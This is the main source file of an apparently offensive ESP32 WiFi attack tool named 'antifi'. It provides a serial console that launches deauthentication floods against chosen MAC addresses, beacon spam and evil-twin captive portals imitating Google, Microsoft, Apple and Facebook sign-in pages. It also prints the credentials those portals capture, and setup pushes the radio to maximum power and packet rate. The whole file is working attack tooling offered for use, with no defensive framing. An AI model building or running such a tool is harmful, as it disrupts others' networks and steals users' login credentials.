#include <cstdio>
#include <cstdlib>
#include <vector>

#include "scan.h"
#include "deauth.h"
#include "beacon.h"
#include "captive_portal.h"
#include "config.h"

void stopAll() {
  scan_setup("stop");
  stop_deauth();
  stop_beacon();
  portalManager.stopPortal();
}

// ===== Command Handlers =====
void handleDeauthCommand(String cmd) {
  char srcMac[18] = { 0 }, tgtMac[18] = { 0 };
  int channel = 1;
  int pps = 25;

  // Try parsing with different formats
  int parsed = sscanf(cmd.c_str(), "deauth -s %17s -t %17s -c %d -p %d", srcMac, tgtMac, &channel, &pps);

  if (parsed == 4) {
    if (channel < 1 || channel > 14) {
      Serial.println(F("Error: Channel must be between 1 and 14"));
      return;
    }
    deauth_setup(srcMac, tgtMac, channel, pps);
    Serial.println(F("Deauth started."));
  } else {
    Serial.println(F("Error: Invalid deauth command format"));
    Serial.println(F("Usage: deauth -s <source_mac> -t <target_mac> -c <channel> -p <packets_per_second>"));
  }
}

void handleStartCommand(String command) {
  // Remove "captive_portal" and trim
  String params = command.substring(14);
  params.trim();

  // Use stack-allocated strings to avoid heap fragmentation
  char ssid[33] = { 0 };   // Max SSID length is 32
  char pass[65] = { 0 };   // Max password length is 64
  char type[20] = "wifi";  // Default type

  // Parse parameters manually to avoid String operations
  const char* params_cstr = params.c_str();
  int firstSpace = params.indexOf(' ');

  if (firstSpace == -1) {
    Serial.println(F("Error: Missing SSID"));
    Serial.println(F("Usage: start <SSID> [password] [type]"));
    return;
  }

  // Extract SSID
  strncpy(ssid, params_cstr, min(firstSpace, 32));
  ssid[32] = '\0';

  // Find next parts
  int secondSpace = params.indexOf(' ', firstSpace + 1);

  if (secondSpace == -1) {
    // Only SSID and possibly password
    if (params.length() > firstSpace + 1) {
      strncpy(pass, params_cstr + firstSpace + 1, 64);
      pass[64] = '\0';
    }
  } else {
    // Extract password
    strncpy(pass, params_cstr + firstSpace + 1, min(secondSpace - firstSpace - 1, 64));
    pass[64] = '\0';

    // Extract type
    strncpy(type, params_cstr + secondSpace + 1, 19);
    type[19] = '\0';
  }

  // Handle empty password representation
  if (strcmp(pass, "''") == 0 || strcmp(pass, "\"\"") == 0 || strcmp(pass, "null") == 0) {
    pass[0] = '\0';
  }

  // Convert type to lowercase
  for (char* p = type; *p; ++p) *p = tolower(*p);

  // Validate portal type
  if (strcmp(type, "wifi") != 0 && strcmp(type, "google") != 0 && strcmp(type, "microsoft") != 0 && strcmp(type, "apple") != 0 && strcmp(type, "facebook") != 0) {
    Serial.print(F("Invalid portal type: "));
    Serial.println(type);
    Serial.println(F("Valid types: wifi, google, microsoft, apple, facebook"));
    return;
  }

  // Validate password length for secured networks
  if (strlen(pass) > 0 && strlen(pass) < 8) {
    Serial.println(F("Warning: Password should be at least 8 characters for WPA2"));
    Serial.println(F("Using open network instead..."));
    pass[0] = '\0';
  }

  Serial.println(F("Starting portal with:"));
  Serial.print(F("  SSID: "));
  Serial.println(ssid);
  Serial.print(F("  Password: "));
  Serial.println(strlen(pass) >= 8 ? "********" : "(open network)");
  Serial.print(F("  Type: "));
  Serial.println(type);

  if (portalManager.startPortal(ssid, pass, type)) {
    Serial.println(F("Portal started successfully!"));
  } else {
    Serial.println(F("Failed to start portal. Please try again."));
  }
}

void processCommand(String cmd) {
  cmd.trim();

  if (cmd.length() == 0) {
    Serial.print(F("antifi> "));
    return;
  }

  String lowerCmd = cmd;
  lowerCmd.toLowerCase();

  Serial.println();

  bool showPrompt = true;  // Flag to control prompt display

  // ====== HELP ======
  if (lowerCmd == "help" || lowerCmd == "?") {
    showHelp();
  }
  // ====== SCAN AP ======
  else if (lowerCmd == "scan -t ap") {
    scan_setup("ap");
    showPrompt = false;  // Don't show prompt for scan commands
  }
  // ====== SCAN STA ======
  else if (lowerCmd == "scan -t sta") {
    scan_setup("sta");
    showPrompt = false;  // Don't show prompt for scan commands
  }
  // ====== DEAUTH ======
  else if (lowerCmd.startsWith("deauth")) {
    handleDeauthCommand(lowerCmd);
  }
  // ====== BEACON ======
  else if (lowerCmd == "beacon -s") {
    beacon_setup();
    showPrompt = false;
  }
  // ====== STOP ALL ======
  else if (lowerCmd == "stop") {
    stopAll();
  }
  // ====== STATUS ======
  else if (lowerCmd == "status") {
    portalManager.printStatus();
  }
  // ====== CREDS ======
  else if (lowerCmd == "creds") {
    portalManager.printCredentials();
  }
  // ====== CLEAR ======
  else if (lowerCmd == "clear") {
    portalManager.clearCredentials();
    Serial.println(F("Credentials cleared"));
  }
  // ====== CAPTIVE PORTAL ======
  else if (lowerCmd.startsWith("captive_portal")) {
    handleStartCommand(lowerCmd);
  }
  // ====== UNKNOWN COMMAND ======
  else {
    Serial.println(F("Error: Unknown command. Type 'help' for available commands."));
  }

  // Show prompt after command completes (except for scan commands)
  if (showPrompt) {
    Serial.print(F("antifi> "));
  }
}

// ===== Serial Input Handler =====
void handleSerialInput() {
  while (Serial.available()) {
    char c = Serial.read();

    if (c == '\n' || c == '\r') {
      if (inputBuffer.length() > 0) {
        processCommand(inputBuffer);
        inputBuffer = "";
        inputBuffer.reserve(64);  // Prevent String from growing too large
      }
    } else if (c == 8 || c == 127) {  // backspace
      if (inputBuffer.length() > 0) {
        inputBuffer.remove(inputBuffer.length() - 1);
        Serial.print("\b \b");
      }
    } else if (c >= 32 && c <= 126) {    // printable
      if (inputBuffer.length() < 128) {  // Limit input length
        inputBuffer += c;
        Serial.print(c);
      }
    }
  }
}

// ===== Memory Monitoring =====
void printMemoryStats() {
  Serial.print(F("Free Heap: "));
  Serial.println(esp_get_free_heap_size());
}

// ===== Setup & Loop =====
void setup() {
  Serial.begin(921600);
  delay(1000);

  pinMode(led, OUTPUT);
  for (int i = 0; i < 3; i++) {
    digitalWrite(led, HIGH);
    delay(200);
    digitalWrite(led, LOW);
    delay(200);
  }

  // Reserve space for input buffer to prevent fragmentation
  inputBuffer.reserve(64);

  setScanDuration(600000);

  // Load custom SSIDs
  loadCustomSSIDs(TARGETED_SSIDS, sizeof(TARGETED_SSIDS)/sizeof(TARGETED_SSIDS[0]));
  
  // Set to maximum power mode
  setTransmissionMode(MODE_NORMAL);
  
  // Use focused channel strategy
  setChannelStrategy(STRAT_FOCUSED);
  setFocusChannel(6);  // Focus on channel 6 (most common)
  
  // Enable all advanced features
  enableSSIDMimicry(true);
  enablePacketBurst(true);
  enableSSIDCache(true);
  enableCommonPasswords(true);
  
  // Set maximum performance
  setMaxPacketsPerSecond(2000);  // Target 2000 packets/second
  setChannelDwellTime(50);       // 50ms per channel
  setPacketInterval(1);          // Minimum delay between packets
  
  // Configure WiFi for maximum performance
  setWiFiMode(WIFI_MODE_APSTA);
  setTxPower(20);  // Maximum TX power
  setChannelBandwidth(WIFI_BW_HT20);

  showBanner();
  Serial.print(F("antifi> "));  // Initial prompt
}

void loop() {
  handleSerialInput();
  portalManager.update();
  deauth_loop();
  beacon_loop();
  scan_loop();
}